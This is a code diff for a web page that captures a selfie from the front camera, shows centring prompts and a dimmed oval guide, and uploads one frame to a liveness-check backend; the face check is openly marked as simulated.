@@ -25,7 +25,7 @@
       width: 100vw;
       height: 100vh;
       object-fit: cover;
-      transform: rotate(0deg); /* prevent orientation auto flip */
+      transform: scaleX(-1); /* Flip for natural selfie */
     }
 
     #overlay {
@@ -33,15 +33,15 @@
       top: 0; left: 0;
       width: 100vw;
       height: 100vh;
-      background-color: rgba(255, 255, 255, 0.3);
-      clip-path: ellipse(40vw 55vh at 50% 50%);
+      background-color: rgba(255, 255, 255, 0.85); /* Stronger dim */
+      clip-path: ellipse(40vw 30vh at 50% 50%);
       pointer-events: none;
     }
 
     #circle {
       position: absolute;
       width: 80vw;
-      height: 110vh;
+      height: 60vh;
       border: 3px solid rgba(0,255,0,0.8);
       border-radius: 50%;
       top: 50%;
@@ -85,18 +85,18 @@
     const video = document.getElementById('camera');
     const prompt = document.getElementById('prompt');
     const statusBox = document.getElementById('status');
-
-    let promptIndex = 0;
-    const prompts = ["Face must be in center", "Move closer", "Look at the screen"];
     const sessionId = new URLSearchParams(location.search).get("session");
 
-    // Rotating prompts
+    const prompts = ["Face must be in center", "Move closer", "Look at the screen"];
+    let promptIndex = 0;
+
+    // Rotate prompts
     setInterval(() => {
       promptIndex = (promptIndex + 1) % prompts.length;
       prompt.textContent = prompts[promptIndex];
     }, 3000);
 
-    // Get camera
+    // Access camera
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
         video.srcObject = stream;
@@ -107,7 +107,7 @@
         statusBox.textContent = "❌ Camera error: " + err.message;
       });
 
-    // 🧠 Liveness Detection (Simple center-frame based capture)
+    // Auto selfie capture (simulated)
     function startAutoCapture() {
       const canvas = document.createElement("canvas");
       const context = canvas.getContext("2d");
@@ -121,16 +121,15 @@
         canvas.height = height;
         context.drawImage(video, 0, 0, width, height);
 
-        // OPTIONAL: Add face detection logic here later.
+        // Fake "face centered" after one capture for now
+        clearInterval(checkInterval);
 
-        // Simulate face centered after a short delay
-        clearInterval(checkInterval); // for now just once
         statusBox.textContent = "⏳ Uploading selfie...";
         const base64 = canvas.toDataURL('image/jpeg');
 
         fetch(`https://spidey-liveness.onrender.com/upload/${sessionId}`, {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ image: base64 })
         })
         .then(res => {
@@ -144,11 +143,12 @@
           statusBox.textContent = "❌ " + err.message;
         });
 
-      }, 4000); // Check every 4 seconds (simulated)
+      }, 4000); // One check in 4 seconds
     }
   </script>
 </body>
 </html>
+
 
 
 
